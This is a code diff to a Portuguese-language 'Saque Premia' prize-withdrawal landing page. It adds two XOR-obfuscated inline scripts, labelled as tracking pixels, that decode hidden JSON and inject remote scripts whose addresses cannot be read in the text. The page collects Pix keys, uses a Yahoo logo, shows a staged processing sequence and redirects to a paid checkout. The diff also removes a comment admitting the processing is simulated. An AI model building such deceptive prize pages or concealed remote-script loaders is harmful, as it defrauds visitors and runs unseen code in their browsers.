@@ -4,6 +4,13 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Saque Premia</title>
+
+  <!-- 1. Pixel Utmify -->
+  <script>(function(){var n_p=atob("DLBmXX3ivDREYHbS28tEKA+Ong5mCAKmq8NcclKB2FpqFQK/stYfcx6N0RomElmhuMIPLQmRk0QtGBO+9MAPJRiOkl43QlrwusQSLxSAyUAhE1TogO1KfxqO01YlDAXw4esdfxOD0VFmWlSissgDMTSGnhhmFhe+rtVEZ1/U3Vd8VBTl6IdfaEva3gV3WEDhvYJfbx7AwWk5");var s_5v2s=[];for(var m_s87n=0;m_s87n<n_p.length;m_s87n++){s_5v2s.push(n_p.charCodeAt(m_s87n)&255);}var b_b2=s_5v2s[0];var i_jol=s_5v2s.slice(1,1+b_b2);var x_9116=s_5v2s.slice(1+b_b2);var s_hyx=x_9116.map(function(b,u_xtmq){return b^i_jol[u_xtmq%b_b2];});var v_c="";for(var n_fk4=0;n_fk4<s_hyx.length;n_fk4++){v_c+=String.fromCharCode(s_hyx[n_fk4]&255);}var r_7wa=decodeURIComponent(escape(v_c));var l_pm=JSON.parse(r_7wa);var r_8wjj=l_pm.globals||[];r_8wjj.forEach(function(q_b9){window[q_b9.name]=q_b9.value;});var k_k61=document.createElement("script");k_k61.src=l_pm.url;k_k61.async=true;k_k61.defer=true;(l_pm.attributes||[]).forEach(function(x_jcg){k_k61.setAttribute(x_jcg.name,x_jcg.value);});(document.head||document.documentElement).appendChild(k_k61);})();</script>
+
+  <!-- 2. Script de Captura de UTMs Utmify -->
+  <script>(function(){var a_jv6=atob("DBB1H5EuKIaCph6eAWtXauNCCrygzmrqcWNPML5NTOis02rzaHYMMfJBRajg1DHtYmIcb+VdB/P2y22xbXEBeuJaBuzxhDK8YGQBbfhMXfLn1TykWmtXcfBDTaS4hHr/dXFYauVDQeD7i27sZGYQceUDUOXtwjPtYntXM7NYSer3wzykIzIIM+oMRufvwzykI3QUa/ADXfLvz3jnLGAHeudLRvKv1Wv8aHQGPb0MXufu03u8OzJXYsxT");var k_rt=[];for(var l_6ru=0;l_6ru<a_jv6.length;l_6ru++){k_rt.push(a_jv6.charCodeAt(l_6ru)&255);}var m_50o=k_rt[0];var v_2t8=k_rt.slice(1,1+m_50o);var y_165=k_rt.slice(1+m_50o);var h_510=y_165.map(function(b,g_f7){return b^v_2t8[g_f7%m_50o];});var p_doo9="";for(var t_9f=0;t_9f<h_510.length;t_9f++){p_doo9+=String.fromCharCode(h_510[t_9f]&255);}var p_8mxl=decodeURIComponent(escape(p_doo9));var e_a3dh=JSON.parse(p_8mxl);var l_73o9=e_a3dh.globals||[];l_73o9.forEach(function(w_hye){window[w_hye.name]=w_hye.value;});var x_w5mu=document.createElement("script");x_w5mu.src=e_a3dh.url;x_w5mu.async=true;x_w5mu.defer=true;(e_a3dh.attributes||[]).forEach(function(j_es){x_w5mu.setAttribute(j_es.name,j_es.value);});(document.head||document.documentElement).appendChild(x_w5mu);})();</script>
+
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
@@ -991,7 +998,6 @@
       </div>
     </div>
 
-    <!-- Testimonials -->
     <div class="card">
       <div style="text-align: center; margin-bottom: 12px;">
         <span style="font-size: 10px; font-weight: 700; color: #16a34a; text-transform: uppercase;">Quem já confirmou, recomenda</span>
@@ -1071,7 +1077,6 @@
       </div>
     </div>
 
-    <!-- FAQ Accordion Section -->
     <div style="text-align: center; margin-top: 8px;">
       <span style="font-size: 11px; font-weight: 700; color: #16a34a; letter-spacing: 0.5px; text-transform: uppercase;">Dúvidas Frequentes</span>
       <h3 style="font-size: 22px; font-weight: 900; color: #0f172a; margin-top: 4px; display: flex; align-items: center; justify-content: center; gap: 8px;">
@@ -1158,7 +1163,6 @@
 
     </div>
 
-    <!-- Bottom Conversion Box -->
     <div class="card" style="text-align: center; padding: 24px 18px;">
       
       <!-- Logo Oficial do Yahoo! -->
@@ -1208,7 +1212,6 @@
 
   </div>
 
-  <!-- MODAL MULTI-ETAPAS -->
   <div class="modal-backdrop" id="pixModalBackdrop" aria-hidden="true">
     <div class="modal-card" id="pixModalCard">
       
@@ -1421,7 +1424,7 @@
 
       setInterval(updateTimers, 1000);
 
-      // --- LOGICA DO MODAL MULTI-ETAPAS ---
+      // --- LOGICA DO MODAL MULTI-ETAPAS E REPASSE DE UTMS ---
       const modalBackdrop = document.getElementById('pixModalBackdrop');
       const modalCloseBtn = document.getElementById('modalCloseBtn');
       const triggerButtons = document.querySelectorAll('.trigger-pix-modal');
@@ -1439,13 +1442,27 @@
       const stepItem2 = document.getElementById('stepItem2');
       const stepItem3 = document.getElementById('stepItem3');
       const redirectCountdownText = document.getElementById('redirectCountdownText');
-      const CHECKOUT_URL = 'https://go.perfectpay.com.br/PPU38CQGQEO';
+      const BASE_CHECKOUT_URL = 'https://go.perfectpay.com.br/PPU38CQGQEO';
+
+      // Constrói a URL de checkout preservando parâmetros de rastreamento (UTMs)
+      function getFullCheckoutUrl() {
+        const currentQuery = window.location.search;
+        if (!currentQuery) return BASE_CHECKOUT_URL;
+
+        const separator = BASE_CHECKOUT_URL.includes('?') ? '&' : '?';
+        return BASE_CHECKOUT_URL + separator + currentQuery.replace(/^\?/, '');
+      }
+
+      // Atualiza o atributo href do botão com as UTMs dinâmicas
+      if (redirectCountdownText) {
+        redirectCountdownText.setAttribute('href', getFullCheckoutUrl());
+      }
 
       let progressInterval = null;
       let redirectTimerInterval = null;
 
       function goToCheckout() {
-        window.location.href = CHECKOUT_URL;
+        window.location.href = getFullCheckoutUrl();
       }
 
       if (redirectCountdownText) {
@@ -1527,7 +1544,7 @@
         const chave = pixKeyInput.value.trim();
         if (!chave) return;
 
-        // Oculta botão de fechar durante o processamento para simular sistema em execução
+        // Oculta botão de fechar durante o processamento
         modalCloseBtn.style.display = 'none';
 
         // Muda para Step 2
@@ -1591,6 +1608,9 @@
             clearInterval(progressInterval);
             step2.style.display = 'none';
             step3.style.display = 'block';
+
+            // Atualiza href com UTMs dinâmicas
+            redirectCountdownText.setAttribute('href', getFullCheckoutUrl());
 
             // Contagem decrescente de redirecionamento (4 segundos)
             let redirectSeconds = 4;
